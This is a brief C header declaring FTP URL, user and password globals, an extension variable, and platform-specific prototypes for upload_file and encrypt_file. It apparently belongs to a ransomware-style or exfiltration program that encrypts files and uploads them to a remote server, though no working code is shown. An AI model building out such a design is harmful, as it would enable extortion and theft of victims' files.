#pragma once

extern char *FTP_URL;
extern char *FTP_USER;
extern char *FTP_PWD;
extern char *EXT;

#ifdef _WIN64
long unsigned int upload_file(void *);
#else
void upload_file(void *);
#endif

#ifdef _WIN64
long unsigned int encrypt_file(void *);
#else
void encrypt_file(void *);
#endif
